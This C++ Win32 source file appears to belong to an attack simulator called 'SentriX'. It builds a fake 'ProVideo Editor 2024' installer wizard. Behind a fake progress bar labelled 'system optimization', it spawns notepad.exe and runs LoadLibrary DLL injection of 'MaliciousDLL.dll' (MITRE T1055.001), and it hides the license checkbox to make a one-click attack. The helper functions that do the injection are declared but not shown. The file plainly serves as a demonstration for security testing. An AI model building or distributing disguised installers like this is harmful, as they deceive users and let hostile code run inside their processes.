#include "framework.h"
#include "FakeSoftwareInstaller.h"
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <thread>
#include <fstream>
#include <tlhelp32.h>
#include <sstream>

#pragma comment(lib, "comctl32.lib")
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Log file path - consistent with Injector and MaliciousDLL
#define SENTRIX_LOG_FILE "C:\\SentriX_injection_proof.txt"
#define SENTRIX_INSTALLER_LOG "C:\\SentriX_installer_log.txt"

// Window Controls
HWND hwndMain;
HWND hwndWelcomeText;
HWND hwndDescriptionText;
HWND hwndLicenseCheck;
HWND hwndProgressBar;
HWND hwndStatusText;
HWND hwndProgressDetail;
HWND hwndInstallBtn;
HWND hwndCancelBtn;
HWND hwndFinishBtn;

// State
bool isInstalling = false;
bool injectionSuccessful = false;
DWORD spawnedTargetPID = 0;

// Function declarations
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void CreateControls(HWND hwnd);
void StartInstallation();
void PerformMaliciousInjection();
DWORD GetProcessIdByName(const wchar_t* processName);
DWORD SpawnTargetProcess();
bool InjectDLL(DWORD processId, const char* dllPath);
std::string GetDLLPath();
void LogActivity(const std::string& message);

// Entry point
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Initialize common controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS | ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icex);

    // Register window class
    const wchar_t CLASS_NAME[] = L"FakeSoftwareInstallerClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = CreateSolidBrush(RGB(240, 240, 240));
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);

    RegisterClass(&wc);

    // Create window
    hwndMain = CreateWindowEx(
        0,
        CLASS_NAME,
        L"ProVideo Editor 2024 - Installation Wizard",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 600, 450,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (hwndMain == nullptr)
    {
        return 0;
    }

    // Center window on screen
    RECT rect;
    GetWindowRect(hwndMain, &rect);
    int windowWidth = rect.right - rect.left;
    int windowHeight = rect.bottom - rect.top;
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(hwndMain, nullptr,
        (screenWidth - windowWidth) / 2,
        (screenHeight - windowHeight) / 2,
        0, 0, SWP_NOSIZE | SWP_NOZORDER);

    CreateControls(hwndMain);

    ShowWindow(hwndMain, nCmdShow);
    UpdateWindow(hwndMain);

    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

void CreateControls(HWND hwnd)
{
    HFONT hFontTitle = CreateFont(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    HFONT hFontNormal = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    HFONT hFontButton = CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    // Header background
    HWND hwndHeader = CreateWindow(L"STATIC", L"",
        WS_CHILD | WS_VISIBLE | SS_OWNERDRAW,
        0, 0, 600, 80,
        hwnd, (HMENU)100, nullptr, nullptr);

    // Logo circle (simulated with text)
    HWND hwndLogo = CreateWindow(L"STATIC", L"●",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        20, 15, 50, 50,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndLogo, WM_SETFONT, (WPARAM)CreateFont(48, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Title in header
    HWND hwndHeaderTitle = CreateWindow(L"STATIC", L"ProVideo Editor 2024",
        WS_CHILD | WS_VISIBLE,
        80, 20, 400, 30,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndHeaderTitle, WM_SETFONT, (WPARAM)hFontTitle, TRUE);

    // Subtitle
    HWND hwndSubtitle = CreateWindow(L"STATIC", L"Professional Video Editing Software",
        WS_CHILD | WS_VISIBLE,
        80, 50, 400, 20,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndSubtitle, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Welcome text
    hwndWelcomeText = CreateWindow(L"STATIC", L"Welcome to ProVideo Editor Setup",
        WS_CHILD | WS_VISIBLE,
        40, 120, 520, 30,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndWelcomeText, WM_SETFONT, (WPARAM)CreateFont(22, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Description
    hwndDescriptionText = CreateWindow(L"STATIC",
        L"Ready to install ProVideo Editor 2024.\r\n\r\nClick 'Install' to start the installation.",
        WS_CHILD | WS_VISIBLE,
        40, 160, 520, 60,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndDescriptionText, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // License checkbox - HIDDEN (not needed for one-click attack)
    hwndLicenseCheck = CreateWindow(L"BUTTON", L"I accept the terms and conditions",
        WS_CHILD | BS_AUTOCHECKBOX,  // Removed WS_VISIBLE
        40, 240, 400, 25,
        hwnd, (HMENU)1, nullptr, nullptr);
    SendMessage(hwndLicenseCheck, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Progress bar (hidden initially)
    hwndProgressBar = CreateWindowEx(0, PROGRESS_CLASS, nullptr,
        WS_CHILD | PBS_SMOOTH,
        40, 200, 520, 30,
        hwnd, nullptr, nullptr, nullptr);

    // Status text (hidden initially)
    hwndStatusText = CreateWindow(L"STATIC", L"Installing...",
        WS_CHILD,
        40, 160, 520, 25,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndStatusText, WM_SETFONT, (WPARAM)CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Progress detail (hidden initially)
    hwndProgressDetail = CreateWindow(L"STATIC", L"Preparing installation...",
        WS_CHILD,
        40, 240, 520, 20,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndProgressDetail, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Buttons
    hwndCancelBtn = CreateWindow(L"BUTTON", L"Cancel",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        360, 360, 100, 35,
        hwnd, (HMENU)2, nullptr, nullptr);
    SendMessage(hwndCancelBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);

    hwndInstallBtn = CreateWindow(L"BUTTON", L"Install",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,  // Removed WS_DISABLED - enabled by default
        470, 360, 100, 35,
        hwnd, (HMENU)3, nullptr, nullptr);
    SendMessage(hwndInstallBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);

    hwndFinishBtn = CreateWindow(L"BUTTON", L"Finish",
        WS_CHILD | BS_PUSHBUTTON,
        470, 360, 100, 35,
        hwnd, (HMENU)4, nullptr, nullptr);
    SendMessage(hwndFinishBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);
}
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        HWND hwndStatic = (HWND)lParam;

        // Header background (dark blue)
        if (GetDlgCtrlID(hwndStatic) == 100)
        {
            SetBkColor(hdcStatic, RGB(44, 62, 80));
            return (LRESULT)CreateSolidBrush(RGB(44, 62, 80));
        }

        // White text for header elements
        if (hwndStatic == FindWindowEx(hwnd, nullptr, L"STATIC", L"ProVideo Editor 2024") ||
            hwndStatic == FindWindowEx(hwnd, nullptr, L"STATIC", L"Professional Video Editing Software"))
        {
            SetTextColor(hdcStatic, RGB(255, 255, 255));
            SetBkColor(hdcStatic, RGB(44, 62, 80));
            return (LRESULT)CreateSolidBrush(RGB(44, 62, 80));
        }

        // Logo color (blue)
        if (hwndStatic == FindWindowEx(hwnd, nullptr, L"STATIC", L"●"))
        {
            SetTextColor(hdcStatic, RGB(52, 152, 219));
            SetBkColor(hdcStatic, RGB(44, 62, 80));
            return (LRESULT)CreateSolidBrush(RGB(44, 62, 80));
        }

        // Default: transparent background
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LRESULT)GetStockObject(NULL_BRUSH);
    }

    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        int wmEvent = HIWORD(wParam);

        // Install button - ONE CLICK ATTACK
        if (wmId == 3 && wmEvent == BN_CLICKED)
        {
            if (!isInstalling)
            {
                StartInstallation();
            }
        }

        // Cancel/Finish buttons
        if (wmId == 2 || wmId == 4)
        {
            DestroyWindow(hwnd);
        }

        break;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        // Draw header background
        RECT headerRect = { 0, 0, 600, 80 };
        HBRUSH headerBrush = CreateSolidBrush(RGB(44, 62, 80));
        FillRect(hdc, &headerRect, headerBrush);
        DeleteObject(headerBrush);

        EndPaint(hwnd, &ps);
        return 0;
    }
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
void StartInstallation()
{
    isInstalling = true;

    // Hide initial UI
    ShowWindow(hwndWelcomeText, SW_HIDE);
    ShowWindow(hwndDescriptionText, SW_HIDE);
    ShowWindow(hwndLicenseCheck, SW_HIDE);
    ShowWindow(hwndInstallBtn, SW_HIDE);

    // Show progress UI
    ShowWindow(hwndStatusText, SW_SHOW);
    ShowWindow(hwndProgressBar, SW_SHOW);
    ShowWindow(hwndProgressDetail, SW_SHOW);

    // Start installation in separate thread
    std::thread installThread([]() {

        const wchar_t* steps[] = {
            L"Extracting files...",
            L"Installing components...",
            L"Configuring settings...",
            L"Registering application...",
            L"Performing system optimization...",  // ← INJECTION HAPPENS HERE
            L"Finalizing installation..."
        };

        SendMessage(hwndProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));

        for (int i = 0; i < 6; i++)
        {
            SetWindowText(hwndProgressDetail, steps[i]);

            // Simulate progress
            for (int j = 0; j < 17; j++)
            {
                int progress = (i * 17) + j;
                SendMessage(hwndProgressBar, PBM_SETPOS, progress, 0);
                Sleep(100);
            }

            // Perform DLL injection during "system optimization"
            if (i == 4)
            {
                LogActivity("Starting malicious injection phase...");
                PerformMaliciousInjection();
            }
        }

        // Complete
        SendMessage(hwndProgressBar, PBM_SETPOS, 100, 0);
        Sleep(500);

        // Show success
        SetWindowText(hwndStatusText, L"Installation Complete!");
        SetWindowText(hwndProgressDetail, L"ProVideo Editor has been successfully installed.");

        ShowWindow(hwndProgressBar, SW_HIDE);
        ShowWindow(hwndCancelBtn, SW_HIDE);
        ShowWindow(hwndFinishBtn, SW_SHOW);

        if (injectionSuccessful)
        {
            MessageBox(hwndMain,
                L"Installation completed successfully!\n\n"
                L"[SentriX] DLL injection was performed successfully.\n"
                L"Check C:\\SentriX_injection_proof.txt for details.",
                L"ProVideo Editor - Setup Complete",
                MB_OK | MB_ICONINFORMATION);
        }
        else
        {
            MessageBox(hwndMain,
                L"Installation completed.\n\n"
                L"[SentriX] Note: DLL injection failed.\n"
                L"Ensure MaliciousDLL.dll is in the same folder.",
                L"ProVideo Editor - Setup Complete",
                MB_OK | MB_ICONWARNING);
        }

        });

    installThread.detach();
}

void PerformMaliciousInjection()
{
    try
    {
        LogActivity("============================================");
        LogActivity("SentriX Attack Simulator - Injection Phase");
        LogActivity("============================================");
        LogActivity("Technique: LoadLibrary DLL Injection");
        LogActivity("MITRE ATT&CK: T1055.001");
        LogActivity("");

        // Step 1: Spawn target process (notepad.exe)
        LogActivity("[STEP 1] Spawning target process (notepad.exe)...");
        spawnedTargetPID = SpawnTargetProcess();

        if (spawnedTargetPID == 0)
        {
            LogActivity("[ERROR] Failed to spawn target process!");
            injectionSuccessful = false;
            return;
        }

        LogActivity("[SUCCESS] Target process spawned: PID " + std::to_string(spawnedTargetPID));

        // Step 2: Get DLL path
        LogActivity("[STEP 2] Resolving MaliciousDLL.dll path...");
        std::string dllPathStr = GetDLLPath();

        // Check if DLL exists
        std::ifstream dllCheck(dllPathStr);
        if (!dllCheck.good())
        {
            LogActivity("[ERROR] DLL not found at: " + dllPathStr);
            LogActivity("[INFO] Please ensure MaliciousDLL.dll is in the same folder as this executable");
            injectionSuccessful = false;
            return;
        }
        dllCheck.close();

        LogActivity("[SUCCESS] DLL found: " + dllPathStr);

        // Step 3: Perform injection
        LogActivity("[STEP 3] Performing LoadLibrary injection...");
        bool success = InjectDLL(spawnedTargetPID, dllPathStr.c_str());

        if (success)
        {
            LogActivity("");
            LogActivity("============================================");
            LogActivity("[SUCCESS] DLL INJECTION COMPLETED!");
            LogActivity("============================================");
            LogActivity("Check proof file: " + std::string(SENTRIX_LOG_FILE));
            injectionSuccessful = true;
        }
        else
        {
            LogActivity("[ERROR] DLL injection failed");
            injectionSuccessful = false;
        }
    }
    catch (...)
    {
        LogActivity("[EXCEPTION] Error during injection");
        injectionSuccessful = false;
    }
}